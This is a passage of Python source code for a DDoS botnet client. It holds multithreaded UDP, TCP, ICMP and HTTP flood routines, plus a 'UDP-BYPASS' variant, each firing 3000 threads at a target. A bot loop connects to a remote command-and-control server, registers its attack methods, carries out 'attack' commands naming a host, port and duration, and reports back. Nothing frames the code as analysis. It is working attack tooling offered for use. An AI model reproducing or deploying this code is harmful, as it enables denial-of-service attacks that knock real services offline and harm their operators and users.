     f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r)
     f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r)
     f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r)
     f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r)
     f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r);f(r)
     c+=250
    except:break
   s.close()
  except:0
 q.put(c)
def atk_udp(i,p,d,z):
 n=3000;z=min(z,65507)if z>0 else 1024;x=b'X'*z;e=time.time()+d;q=mp.Queue();th=[]
 print(f"[UDP]{i}:{p} {d}s {n}th sz:{z}")
 for _ in range(n):t=threading.Thread(target=wu,args=(i,p,x,e,q),daemon=1);t.start();th.append(t)
 for t in th:t.join()
 c=0
 while not q.empty():c+=q.get()
 print(f"[+]{c:,}pkt {c//d:,}pps")
def atk_udp_bypass(i,p,d,z):
 n=3000;z=min(z,65507)if z>0 else 1024;x=b'X'*z;e=time.time()+d;q=mp.Queue();th=[]
 print(f"[UDP-BYPASS]{i}:{p} {d}s {n}th sz:{z}")
 for _ in range(n):t=threading.Thread(target=wub,args=(i,p,x,e,q),daemon=1);t.start();th.append(t)
 for t in th:t.join()
 c=0
 while not q.empty():c+=q.get()
 print(f"[+]{c:,}pkt {c//d:,}pps")
def atk_tcp(i,p,d,z):
 n=3000;z=min(z,65507)if z>0 else 1024;x=b'X'*z;e=time.time()+d;q=mp.Queue();th=[]
 print(f"[TCP]{i}:{p} {d}s {n}th sz:{z}")
 for _ in range(n):t=threading.Thread(target=wt,args=(i,p,x,e,q),daemon=1);t.start();th.append(t)
 for t in th:t.join()
 c=0
 while not q.empty():c+=q.get()
 print(f"[+]{c:,}pkt {c//d:,}pps")
def atk_icmp(i,p,d,z):
 n=3000;z=min(z,65500)if z>0 else 1024
 h=struct.pack('!BBHHH',8,0,0,1,1)+b'X'*z
 cs=ck(h);h=struct.pack('!BBHHH',8,0,cs,1,1)+b'X'*z
 e=time.time()+d;q=mp.Queue();th=[]
 print(f"[ICMP]{i} {d}s {n}th sz:{z}")
 for _ in range(n):t=threading.Thread(target=wi,args=(i,h,e,q),daemon=1);t.start();th.append(t)
 for t in th:t.join()
 c=0
 while not q.empty():c+=q.get()
 print(f"[+]{c:,}pkt {c//d:,}pps")
def atk_http(url,p,d,z):
 n=3000;e=time.time()+d;q=mp.Queue();th=[]
 try:
  u=urlparse(url if '://' in url else 'http://'+url)
  h=u.hostname or url.replace('https://','').replace('http://','').split('/')[0]
  pt=u.path or '/';us=u.scheme=='https'
  pr=u.port or(443 if us else 80)
 except:h=url;pt='/';us=False;pr=80
 print(f"[HTTP]{h}:{pr}{pt} {d}s {n}th ssl:{us}")
 for _ in range(n):t=threading.Thread(target=wh,args=(url,h,pr,pt,us,e,q),daemon=1);t.start();th.append(t)
 for t in th:t.join()
 c=0
 while not q.empty():c+=q.get()
 print(f"[+]{c:,}req {c//d:,}rps")
def bot():
 b=None
 while 1:
  try:
   s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(30);s.connect((S,P))
   s.sendall(json.dumps({"type":"register","status":"ready","methods":["UDP","TCP","ICMP","HTTP","UDP-BYPASS"],"version":"v2"}).encode()+b'\n');buf=""
   while 1:
    try:
     r=s.recv(4096)
     if not r:break
     try:r=r.decode('utf-8',errors='ignore')
     except:continue
     buf+=r
     while '\n'in buf:
      l,buf=buf.split('\n',1)
      if not l.strip():continue
      try:
       c=json.loads(l)
       if c.get('type')=='attack':
        m=c.get('method','UDP').upper()
        if m=='TCP':threading.Thread(target=atk_tcp,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
        elif m=='ICMP':threading.Thread(target=atk_icmp,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
        elif m=='HTTP':threading.Thread(target=atk_http,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
        elif m=='UDP-BYPASS':threading.Thread(target=atk_udp_bypass,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
        else:threading.Thread(target=atk_udp,args=(c['host'],c['port'],c['timeout'],c['size']),daemon=1).start()
        s.sendall(json.dumps({"type":"ack","bot_id":b,"status":"ok","command_id":c.get('command_id')}).encode()+b'\n')
       elif c.get('type')=='assign_id':b=c.get('bot_id')
      except:0
    except socket.timeout:
     try:s.sendall(json.dumps({"type":"keepalive","bot_id":b}).encode()+b'\n')
     except:break
    except:break
   s.close()
  except:time.sleep(5)
if __name__=="__main__":bot()
